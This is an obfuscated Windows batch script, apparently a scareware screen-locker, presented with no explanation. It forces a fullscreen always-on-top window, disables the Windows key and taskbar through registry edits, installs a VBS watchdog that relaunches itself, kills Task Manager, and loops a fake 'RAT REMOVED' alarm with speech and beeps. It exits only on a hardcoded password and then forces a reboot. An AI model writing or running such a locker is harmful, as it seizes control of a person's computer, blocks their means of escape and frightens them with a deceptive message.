@eChO oFf
sEt "rAnDoM=9*&^*GTt5ytv7f58t69v&*t5f*T%v&T8^%8T"
MoDe cOn cOlS=9999 lInEs=9999
pOwErShElL -cOmMaNd "& {aDd-tYpE -aSsEmBlYnAmE sYsTeM.wInDoWs.FoRmS; [sYsTeM.wInDoWs.FoRmS.sEnDkEyS]::sEnDwAiT('{F11}')}" >nUl 2>&1

REM %rAnDoM% ^&*XyZ123
bReAk oFf

REM Force stay on top and fullscreen
pOwErShElL -cOmMaNd "& {Add-Type '[DllImport(\"user32.dll\")]public static extern int SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int y, int cx, int cy, int uFlags);' -Name a -Pas; $h = (Get-Process -Id $pid).MainWindowHandle; [a]::SetWindowPos($h, -1, 0, 0, 0, 0, 0x43)}" >nUl 2>&1

REM Disable Windows key and hide taskbar
rEg aDd "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f >nUl 2>&1
rEg aDd "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f >nUl 2>&1
pOwErShElL -cOmMaNd "& {Add-Type '[DllImport(\"user32.dll\")]public static extern int ShowWindow(int hwnd, int nCmdShow);' -Name b -Pas; [b]::ShowWindow((Get-Process -Name explorer).MainWindowHandle | select -First 1, 0)}" >nUl 2>&1

REM Create a watchdog to restart if closed
eChO @eChO oFf > wAtCh.vBs
eChO :lOoP >> wAtCh.vBs
eChO SeT wSh = cReAtEoBjEcT("WScript.Shell") >> wAtCh.vBs
eChO If NoT wSh.ApPExEcUtE("cmd.exe /c %~nx0") Then >> wAtCh.vBs
eChO wSh.RuN "%~nx0" >> wAtCh.vBs
eChO EnD iF >> wAtCh.vBs
eChO wScRiPt.SlEeP 1000 >> wAtCh.vBs
eChO GoTo lOoP >> wAtCh.vBs
sTaRt "" /b cScRiPt //nOlOgO wAtCh.vBs

:lOoP
cOlOr 0c
ClS
EcHo.
eChO.
eChO          RAT REMOVED
eChO.
eChO.
REM %rAnDoM% *^&%GhJkL

REM Text-to-speech
eChO @eChO oFf > tEmP.vBs
eChO sEt sApI = cReAtEoBjEcT("SAPI.SpVoice") >> tEmP.vBs
eChO sApI.sPeAk "RAT REMOVED" >> tEmP.vBs
cScRiPt //nOlOgO tEmP.vBs
DeL tEmP.vBs

REM Beeps
eChO @eChO oFf > tEmP2.vBs
eChO sEt wShShElL = cReAtEoBjEcT("WScript.Shell") >> tEmP2.vBs
eChO FoR i = 1 tO 15 >> tEmP2.vBs
eChO wShShElL.sEnDkEyS cHr(7) >> tEmP2.vBs
eChO wScRiPt.sLeEp 150 >> tEmP2.vBs
eChO NeXt >> tEmP2.vBs
cScRiPt //nOlOgO tEmP2.vBs
dEl tEmP2.vBs

REM Block Task Manager and other exits
eChO @eChO oFf > tEmP3.vBs
eChO sEt wSh = cReAtEoBjEcT("WScript.Shell") >> tEmP3.vBs
eChO wSh.rUn "cmd /c taskkill /f /im taskmgr.exe", 0, fAlSe >> tEmP3.vBs
cScRiPt //nOlOgO tEmP3.vBs
DeL tEmP3.vBs

TiMeOuT /t 1 >nUl
cLs
tImEoUt /t 1 >nUl

REM %rAnDoM% QwErTy
SeT "iNpUt="
sEt /p iNpUt="eNtEr pAsSwOrD tO eXiT: "
If /I "%iNpUt%"=="123fish" gOtO :eXiT
gOtO lOoP

:eXiT
REM Cleanup: Re-enable Windows key and show taskbar
rEg dElEtE "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /f >nUl 2>&1
rEg dElEtE "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /f >nUl 2>&1
pOwErShElL -cOmMaNd "& {Add-Type '[DllImport(\"user32.dll\")]public static extern int ShowWindow(int hwnd, int nCmdShow);' -Name b -Pas; [b]::ShowWindow((Get-Process -Name explorer).MainWindowHandle | select -First 1, 5)}" >nUl 2>&1
TaSkKiLl /f /im cscript.exe >nUl 2>&1
dEl wAtCh.vBs
sHuTdOwN /r /t 5 /c "System restarting in 5 seconds..."
eXiT